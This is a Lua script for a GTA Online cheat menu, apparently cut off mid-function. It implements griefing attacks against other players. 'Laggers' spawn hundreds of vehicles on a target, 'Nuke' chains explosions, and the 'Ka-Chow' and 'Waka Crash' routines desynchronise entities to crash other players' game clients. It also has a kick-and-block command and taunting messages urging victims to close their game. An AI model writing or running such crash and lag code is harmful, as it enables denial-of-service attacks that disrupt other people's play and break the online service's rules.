local Laggers_List = menu.list(Plyrveh_list, "Laggers", {"laggers"}, "")
menu.divider(Laggers_List, "Yatekomo Laggers")

menu.action(Laggers_List,"Large penetrator", {}, "Lag", function() -- cpu burn simulator v2
    while not STREAMING.HAS_MODEL_LOADED(2336777441) do
        STREAMING.REQUEST_MODEL(2336777441)
        util.yield(10)
    end
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

    notification("Started lagging the fuck out of him", colors.black)
    --menu.trigger_commands("anticrashcamera on")
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(2336777441, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
    notification("Done", colors.green) -- cpu burned congrats
    --menu.trigger_commands("anticrashcamera off")
end)

menu.action(Laggers_List,"CPU ", {}, "do do do it", function() -- cpu burn simulator v2
    while not STREAMING.HAS_MODEL_LOADED(2336777441) do
        STREAMING.REQUEST_MODEL(2336777441)
        util.yield(10)
    end
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
    menu.trigger_commands("anticrashcamera on")
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(2336777441, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
    --menu.trigger_commands("anticrashcamera off")
end)

local function offset_coords_forward(pos, heading, distance)
    local newpos = pos
    heading = math.rad((heading - 180) * -1)
    newpos.x = pos.x + (math.sin(heading) * -distance)
    newpos.y = pos.y + (math.cos(heading) * -distance)
    newpos.z = pos.z
    return newpos
end

menu.action(Laggers_List, "Nuke", {}, "Nuke the player", function() --anonym nuke
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(p), ENTITY.GET_ENTITY_HEADING(p), 100)
    local defx = 0
    local defy = 0
    local defz = 0
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
     defz = defz + 2
    c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
     util.yield(50)
    defz = defz + 2
    c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defx = defx + 2
    defy = defy + 2
    c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    while not STREAMING.HAS_MODEL_LOADED(2336777441) do
        STREAMING.REQUEST_MODEL(2336777441)
        util.yield(10)
    end
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local PlayerPedCoords = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(player_ped, true), ENTITY.GET_ENTITY_HEADING(player_ped), 300)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(2336777441, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local PlayerPedCoords = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(player_ped, true), ENTITY.GET_ENTITY_HEADING(player_ped), 300)
    spam_amount = 300
    while spam_amount >= 1 do
        entities.create_vehicle(2336777441, PlayerPedCoords, 0)
        spam_amount = spam_amount - 1
        util.yield(10)
    end
    local ct = 0       
    notification("Working")
    for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)
        ct = ct + 1
    end
    util.toast("Finished")
    for k, ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
        end
        ct = ct + 1
    end
end)


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

        local begcrash = {
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Hey bro, it would be pretty poggers to close your game for me",
            "pwease cwash yowour game fowor me",
            "Close your game. I'm not asking.",
            "Please close your game, please please please please please",
            "Please close your game, please please please please please",
        }

-------------------------------------------------------------------------------------------------------------------------------------------------------------

    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS

    local function tpTableToPlayer(tbl, pid)
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
            local c = getEntityCoords(getPlayerPed(pid))
            for _, v in pairs(tbl) do
                if (not PED.IS_PED_A_PLAYER(v)) then
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
                end
            end
        end
    end

    function TpAllPeds(player)
        local pedHandles = entities.get_all_peds_as_handles()
        tpTableToPlayer(pedHandles, player)
    end
    function TpAllVehs(player)
        local vehHandles = entities.get_all_vehicles_as_handles()
        tpTableToPlayer(vehHandles, player)
    end
    function TpAllObjects(player)
        local objHandles = entities.get_all_objects_as_handles()
        tpTableToPlayer(objHandles, player)
    end
    function TpAllPickups(player)
        local pickupHandles = entities.get_all_pickups_as_handles()
        tpTableToPlayer(pickupHandles, player)
    end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


    function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    function CreatePed(index, Hash, Pos, Heading)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        return SpawnedVehicle
    end
    function CreateObject(Hash, Pos, static)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_object(Hash, Pos)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if static then
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end

    function is_ped_player(ped)
        if PED.GET_PED_TYPE(ped) >= 4 then
            return false
        else
            return true
        end
    end

menu.toggle(custselc, "Exclude Selected", {"excludepussies"}, "", function(on_toggle)
    if on_toggle then
        excludeselected = true
    else
        excludeselected = false
    end
end, true)

selectedplayer = {}
for b = 0, 31 do
    selectedplayer[b] = false
end
excludeselected = false

cmd_id = {}
for i = 0, 31 do
	cmd_id[i] = 0
end

local chaos, gravity, speed = false, true, 100

menu.divider(custselc, "Ka-Chows")

local planes = {'cuban800','titan','duster','luxor','Stunt','mammatus','velum','Shamal','Lazer','vestra','volatol','besra',
'dodo','alkonost','velum2','hydra','luxor2','nimbus','howard','alphaz1','seabreeze','nokota','molotok','starling','tula',
'microlight','rogue','pyro','mogul','strikeforce','avenger','avenger2','bombushka'}
local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(custselc, listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {"deletecrash"}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {"tptoentity"}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {"driveentity"}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {"tpentitytome"}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end

menu.toggle_loop(custselc, "Boosted Ka-Chow", {"boostkachow"}, "", function()
    menu.trigger_commands("kachowww")
    menu.trigger_commands("moreothers")
end)

-- local jet_netID;
menu.toggle_loop(custselc, "Ka-Chow", {"kachowww"}, "Press and hold down the enter button", function()
    menu.trigger_commands("anticrashcamera on")
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coords = coords[math.random(1, #coords)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planes[math.random(1, #planes)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("Waiting 5sec for syncs...")
        util.yield(3500) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            --ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("Alert | You are not in a vehicle")
        RqModel(util.joaat('lazer'))
        local spawn_in = entities.create_vehicle(util.joaat('lazer'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
end)

menu.toggle_loop(custselc, "Spawn Others", {"moreothers"}, "May improve crashing.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " cuban800")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " titan")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " duster")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " luxor")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Stunt")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " velum")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Shamal")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Lazer")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " vestra")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " volatol")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " besra")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " dodo")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " alkonost")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " velum2")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " hydra")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " luxor2")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " nimbus")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " howard")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " alphaz1")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " seabreeze")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " nokota")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " molotok")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " starling")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " tula")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " microlight")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " rogue")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " pyro")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " mogul")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " strikeforce")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " avenger")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " avenger2")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " bombushka")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " microlight")
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " cuban800")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " titan")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " duster")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " luxor")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Stunt")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " velum")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Shamal")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Lazer")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " vestra")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " volatol")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " besra")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " dodo")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " alkonost")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " velum2")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " hydra")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " luxor2")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " nimbus")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " howard")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " alphaz1")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " seabreeze")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " nokota")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " molotok")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " starling")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " tula")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " microlight")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " rogue")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " pyro")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " mogul")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " strikeforce")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " avenger")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " avenger2")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " bombushka")
                util.yield(10)
                menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " microlight")
            end
        end
    end
end)


menu.toggle_loop(custselc, "Delete Crash Every 5 Seconds", {"deletingcrash"}, "Delete every 5 seconds.", function()
    util.yield(5000)
    menu.trigger_commands("deletecrash")
    menu.trigger_commands("noentities")
    util.yield(1000)
    menu.trigger_commands("noentities")
end)


menu.toggle_loop(custselc, "Crash Cam Off", {}, "", function()
    menu.trigger_commands("anticrashcamera off")
end)

menu.toggle_loop(custselc, "TP On Ped Loop", {"tploops"}, "If they dont crash use this.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        end
    end
end)

menu.toggle(custselc, "Blast Kick", {}, "Blocks Joins And Kicks Them.", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("breakup" .. PLAYER.GET_PLAYER_NAME(pids))
                menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("breakup" .. PLAYER.GET_PLAYER_NAME(pids))
                menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        end
    end
end)

menu.toggle(custselc, "Block Player", {}, "", function()
    for pids = 0, 31 do
        if excludeselected then
            if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        else
            if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                menu.trigger_commands("historyblock" .. PLAYER.GET_PLAYER_NAME(pids))
                util.yield()
            end
        end
    end
end)

menu.divider(custselc, "GG's")

for pids = 0, 31 do
    if players.exists(pids) then
        cmd_id[pids] = menu.toggle(custselc, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "PID - ".. pids, function(on_toggle)
            if on_toggle then
                selectedplayer[pids] = true
            else
                selectedplayer[pids] = false
            end
        end)
    end
end


local planesss = {'cutter'} -- 'tr3','chernobog','avenger',


playerposition = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Failed To Load Model :L")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

NetworkControl = function(entity, timeOut)
	timeOut = timeOut or 1000
	local start = util.current_time_millis()
	while not NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and
	util.current_time_millis() - start < timeOut do
		util.yield_once()
	end
	return util.current_time_millis() - start < timeOut
end

local function deletehandlers(list)
    for _, entity in pairs(list) do
        if ENTITY.DOES_ENTITY_EXIST(entity) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
            NetworkControl(entity)
            entities.delete_by_handle(entity)
        end
    end
end

request_stream_of_entity = function(entity, time)
    local unixtime = util.current_unix_time_seconds()
    local seconds = unixtime + time
    STREAMING.REQUEST_MODEL(entity)
    while not STREAMING.HAS_MODEL_LOADED(entity) and unixtime < seconds do
        STREAMING.REQUEST_MODEL(entity)
        util.yield()
    end
    if STREAMING.HAS_MODEL_LOADED(entity) then
        return entity
    else
        return 0
    end
end

player_coords = function(pid)
    local player_coords = ENTITY.GET_ENTITY_COORDS(player_index(pid), true)
    return player_coords
end

local crash = {
    -877478386,
    2099682835,
}

waka_crash = function(pid)
    for i, v in pairs(crash) do
        request_stream_of_entity(v, 1)
    end
    for i = 1, 2 do
        local coords = player_coords(pid)
        trailer = entities.create_vehicle(-877478386, coords, 0.0)
        object = entities.create_object(2099682835, coords, 0.0)
        ENTITY.SET_ENTITY_VISIBLE(trailer, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(object, false, 0)
        ENTITY.SET_ENTITY_VELOCITY(trailer, 5, 3, 3)
        ENTITY.SET_ENTITY_VELOCITY(object, 3, 4, 5)
        for i = 1, 3 do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(trailer, object, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            coords.x = coords.x
            coords.y = coords.y + 20
            coords.z = coords.z
            local vehicle = entities.create_vehicle(-877478386, coords, 0.0)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -100, 0, true, false, true)
            util.yield(300)
            --ENTITY.DETACH_ENTITY(trailer, true, true)
            end
            util.yield(1000)
            menu.trigger_commands("noentities")
            util.yield(3000)
            menu.trigger_commands("noentities")
            end
        end


    local wakacrashes = menu.list(Removals_List, "Waka Crash", {}, "")

    menu.action(wakacrashes, "Waka Crash", {"wakacrash"}, "Made by crystal.", function()
        waka_crash(pid)
    end)

    menu.toggle_loop(wakacrashes, "Waka Crash Looped", {"wakaloop"}, "", function()
        waka_crash(pid)
        menu.trigger_commands("stopspectating")
    end)

-----------------------------------------------------------------------------------------------------------
local kachowlatest = menu.list(Removals_List, "Ka-Chow", {}, "")

local planes = {'hydra','volatol','duster','luxor','Lazer','mammatus','velum','Shamal','Stunt','vestra','titan','besra',
'dodo','alkonost','velum2','cuban800','luxor2','nimbus','howard','alphaz1','seabreeze','nokota','molotok','starling','tula',
'microlight','rogue','pyro','mogul','strikeforce','avenger','avenger2','bombushka'}
local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(kachowlatest, listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {"deletecrashes"}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {"tptoentity"}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {"driveentity"}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {"tpentitytome"}, "", function()
